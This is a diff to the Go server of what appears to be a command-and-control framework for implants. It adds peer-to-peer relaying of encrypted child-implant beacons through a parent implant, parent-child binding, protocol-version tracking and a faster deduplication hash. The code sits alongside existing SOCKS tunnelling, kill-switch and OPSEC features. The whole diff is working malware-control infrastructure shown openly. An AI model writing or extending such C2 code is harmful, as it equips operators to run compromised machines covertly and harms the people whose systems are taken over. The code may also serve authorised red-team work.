@@ -7,6 +7,7 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"hash/fnv"
 	"log/slog"
 	"net"
 	"net/http"
@@ -40,6 +41,7 @@ type beaconRequest struct {
 	TaskCapacity    *int              `json:"task_capacity,omitempty"`
 	SocksData       []socksFrame      `json:"socks_data,omitempty"`
 	Relayed         []relayedData     `json:"relayed,omitempty"` // P2P: child results forwarded by parent
+	RelayedFrames   []relayedFrame    `json:"relayed_frames,omitempty"` // P2P v2: opaque child envelopes
 
 	// ECDH + AES-256-GCM fields (forward-secret encryption)
 	ECDHPub   string `json:"ecdh_pub,omitempty"` // base64-encoded X25519 public key
@@ -50,6 +52,21 @@ type relayedData struct {
 	AgentID    string       `json:"agent_id"` // child agent UUID
 	Results    []taskResult `json:"results"`
 	AckTaskIDs []uint       `json:"acks,omitempty"`
+}
+
+// relayedFrame is an opaque v2 beacon envelope from a P2P child, forwarded
+// verbatim by its parent. It is authenticated end-to-end with the child's
+// session key, so a malicious parent cannot forge or read it.
+type relayedFrame struct {
+	AgentID  string `json:"agent_id"` // child agent UUID
+	Envelope []byte `json:"envelope"` // raw envelope JSON bytes
+}
+
+// relayedReply is an opaque v2 response envelope built by the server for a
+// P2P child and forwarded verbatim by its parent.
+type relayedReply struct {
+	AgentID  string `json:"agent_id"`
+	Envelope []byte `json:"envelope"`
 }
 
 type taskResult struct {
@@ -95,9 +112,10 @@ type beaconResponse struct {
 	Seq             uint64        `json:"seq,omitempty"`
 	RegOK           bool          `json:"reg_ok,omitempty"`
 	Rekey           bool          `json:"rekey,omitempty"`
-	SocksFrames     []socksFrame  `json:"socks_frames,omitempty"`
-	SocksFastMode   bool          `json:"socks_fast,omitempty"`
-	Relayed         []relayedTask `json:"relayed,omitempty"` // P2P: tasks for children
+	SocksFrames   []socksFrame  `json:"socks_frames,omitempty"`
+	SocksFastMode bool          `json:"socks_fast,omitempty"`
+	Relayed       []relayedTask `json:"relayed,omitempty"` // P2P: tasks for children
+	RelayedReplies []relayedReply `json:"relayed_replies,omitempty"` // P2P v2: opaque child response envelopes
 
 	// Fleet kill-switch broadcast: both fields are set only while the
 	// kill-switch is armed. KillSwitch is the per-arm token (hex) and
@@ -625,6 +643,7 @@ func (s *Server) processAgentRegistration(req beaconRequest, publicIP string, no
 			PublicIP:        publicIP,
 			LastSeen:        now,
 			Status:          "online",
+			ProtocolVersion: req.ProtocolVersion,
 			Version:         req.Info["version"],
 			PID:             parseInt("pid"),
 			ProcessName:     req.Info["process_name"],
@@ -730,6 +749,12 @@ func (s *Server) processAgentRegistration(req beaconRequest, publicIP string, no
 		}
 		if v, ok := req.Info["env_class"]; ok {
 			updates["env_class"] = v
+		}
+		// Protocol version is merged into the single registration update so
+		// regular beacons do not issue an extra UPDATE per check-in; it only
+		// writes when the value actually changes.
+		if req.ProtocolVersion > 0 && agent.ProtocolVersion != req.ProtocolVersion {
+			updates["protocol_version"] = req.ProtocolVersion
 		}
 
 		// Atomic update: only update if last_seen hasn't been changed by a concurrent beacon
@@ -1188,6 +1213,127 @@ func (s *Server) processRelayedResults(relayed []relayedData, parentUUID string,
 	}
 }
 
+// maxRelayEnvelopeSize caps a single relayed child envelope (JSON with a
+// base64 ciphertext payload; a decrypted request is bounded separately by
+// Crypto.MaxDecryptedPayloadSize).
+const maxRelayEnvelopeSize = 16 << 20 // 16 MiB
+
+// maxRelayDepth bounds recursive P2P envelope relay nesting. Each parent hop
+// embeds child envelopes in its own envelope; an unbounded chain would let
+// frames recurse indefinitely server-side.
+const maxRelayDepth = 4
+
+// processRelayedEnvelopes handles opaque child envelopes forwarded by a P2P
+// parent. Each envelope is authenticated against the child's own session key
+// (never derived from the parent), so a compromised parent cannot read,
+// forge, or alter a child's traffic — it is a transparent byte relay only.
+// Valid frames are processed exactly like a direct beacon (registration,
+// handshake and encrypted frames all work), and the child's response
+// envelope is returned to the parent for verbatim forwarding.
+func (s *Server) processRelayedEnvelopes(frames []relayedFrame, parentUUID, publicIP string, now time.Time) []relayedReply {
+	if len(frames) == 0 {
+		return nil
+	}
+
+	s.relayDepthMu.Lock()
+	s.relayDepth++
+	depth := s.relayDepth
+	s.relayDepthMu.Unlock()
+	defer func() {
+		s.relayDepthMu.Lock()
+		s.relayDepth--
+		s.relayDepthMu.Unlock()
+	}()
+
+	if depth > maxRelayDepth {
+		slog.Warn("P2P relay depth exceeded, dropping envelvelope relay", "parent", parentUUID, "depth", depth)
+		return nil
+	}
+
+	replies := make([]relayedReply, 0, len(frames))
+	for _, rf := range frames {
+		if rf.AgentID == "" || !isValidAgentID(rf.AgentID) {
+			slog.Warn("P2P relay dropped: invalid child agent id", "parent", parentUUID)
+			continue
+		}
+		if len(rf.Envelope) == 0 || len(rf.Envelope) > maxRelayEnvelopeSize {
+			slog.Warn("P2P relay dropped: bad envelope size", "parent", parentUUID, "child", rf.AgentID, "size", len(rf.Envelope))
+			continue
+		}
+
+		childEnv, childReq, kind := s.decodeBeaconEnvelope(rf.Envelope)
+		if kind == frameRejected {
+			slog.Warn("P2P relay dropped: child frame rejected", "parent", parentUUID, "child", rf.AgentID)
+			continue
+		}
+
+		// Enforce the parent-child relationship. A child may only be relayed
+		// by its registered parent (the operator links children in the
+		// topology view); an unbound child is bound on first relay so that
+		// register/handshake frames can bootstrap through the parent.
+		if !s.bindRelayChildToParent(rf.AgentID, parentUUID) {
+			slog.Warn("P2P relay dropped: child not linked to this parent", "parent", parentUUID, "child", rf.AgentID)
+			continue
+		}
+
+		var replyBytes []byte
+		var ok bool
+		if kind == frameEncrypted {
+			// Clip the child's nested relay fields: children relaying in turn
+			// is handled by the next beacon round, not recursive inlining.
+			childReq.RelayedFrames = nil
+			resp := s.processBeacon(childReq, publicIP)
+			if s.sessionManager != nil && s.sessionManager.NeedsRekey(rf.AgentID, BeaconSessionRekeyMessages) {
+				resp.Rekey = true
+			}
+			replyBytes, ok = s.buildBeaconResponse(rf.AgentID, childEnv.Seq, resp)
+		} else {
+			replyBytes, ok = s.processAuthFrame(childEnv, kind)
+		}
+		if !ok {
+			slog.Warn("P2P relay failed to build child response", "parent", parentUUID, "child", rf.AgentID)
+			continue
+		}
+		replies = append(replies, relayedReply{AgentID: rf.AgentID, Envelope: replyBytes})
+	}
+	return replies
+}
+
+// bindRelayChildToParent enforces/lazily binds the parent-child link for a
+// relayed child. A child with no DB row (fresh registration through the
+// parent) is bound to the relaying parent; a child already linked to a
+// different parent is rejected (protects against relay hijacking).
+func (s *Server) bindRelayChildToParent(childID, parentUUID string) bool {
+	var agent db.Implant
+	err := s.db.Where("id = ?", childID).First(&agent).Error
+	if err == gorm.ErrRecordNotFound {
+		row := db.Implant{ID: childID, ParentID: parentUUID, LastSeen: time.Now(), Status: "online"}
+		if cerr := s.db.Create(&row).Error; cerr != nil {
+			// Concurrent create raced: re-check the winner's parent binding.
+			if rerr := s.db.Where("id = ?", childID).First(&agent).Error; rerr != nil {
+				slog.Debug("bindRelayChildToParent create raced", "child", childID, "error", cerr)
+				return false
+			}
+			if agent.ParentID != "" && agent.ParentID != parentUUID {
+				return false
+			}
+			if agent.ParentID == "" {
+				s.db.Model(&db.Implant{}).Where("id = ?", childID).Update("parent_id", parentUUID)
+			}
+			return true
+		}
+		return true
+	}
+	if err != nil {
+		slog.Error("Failed to check relay child link", "child", childID, "error", err)
+		return false
+	}
+	if agent.ParentID == "" {
+		return s.db.Model(&db.Implant{}).Where("id = ?", childID).Update("parent_id", parentUUID).Error == nil
+	}
+	return agent.ParentID == parentUUID
+}
+
 func (s *Server) fetchPendingTasks(uuid string, limits ...int) []task {
 	var claimedTasks []db.Task
 	limit := BeaconTaskFetchLimit
@@ -1481,11 +1627,14 @@ func (s *Server) enforceKillSwitch(agent db.Implant, resp *beaconResponse) {
 }
 
 // beaconFingerprint returns a dedup key for a beacon request.
-// beaconFingerprint returns a content-derived fingerprint for duplicate detection.
-// It hashes the actual payload (results, SOCKS frames, acks, relayed data) so
-// that beacons carrying different data are never mistaken for duplicates.
+// It reduces the actual payload (results, SOCKS frames, acks, relayed data)
+// to a stable fingerprint so that beacons carrying different data are never
+// mistaken for duplicates. FNV-1a 64-bit is used instead of SHA-256 because
+// this runs on every beacon and only needs collision resistance against the
+// bounded in-memory dedup cache (10k entries, 5s window), not cryptographic
+// integrity.
 func beaconFingerprint(req beaconRequest) string {
-	h := sha256.New()
+	h := fnv.New64a()
 	h.Write([]byte(req.UUID))
 	for _, r := range req.Results {
 		h.Write([]byte(r.Type))
@@ -1607,11 +1756,6 @@ func (s *Server) processBeacon(req beaconRequest, publicIP string) beaconRespons
 		return beaconResponse{}
 	}
 
-	// Store agent protocol version for future task format selection
-	if req.ProtocolVersion > 0 {
-		s.db.Model(&agent).Update("protocol_version", req.ProtocolVersion)
-	}
-
 	// Wire agent environment threat score to adaptive OPSEC manager
 	if s.opsecAdaptive != nil && agent.EnvThreatScore > 0 {
 		for i := 0; i < agent.EnvThreatScore/20; i++ {
@@ -1632,6 +1776,8 @@ func (s *Server) processBeacon(req beaconRequest, publicIP string) beaconRespons
 		s.processRelayedResults(req.Relayed, req.UUID, now)
 	}
 
+	relayedReplies := s.processRelayedEnvelopes(req.RelayedFrames, req.UUID, publicIP, now)
+
 	taskLimit := BeaconTaskFetchLimit
 	if req.TaskCapacity != nil && *req.TaskCapacity >= 0 && *req.TaskCapacity < taskLimit {
 		taskLimit = *req.TaskCapacity
@@ -1639,6 +1785,7 @@ func (s *Server) processBeacon(req beaconRequest, publicIP string) beaconRespons
 	resp := beaconResponse{
 		Tasks:           s.fetchPendingTasks(req.UUID, taskLimit),
 		Relayed:         s.fetchRelayedChildTasks(req.UUID),
+		RelayedReplies:  relayedReplies,
 		ProtocolVersion: protocol.CurrentProtocolVersion,
 	}
 
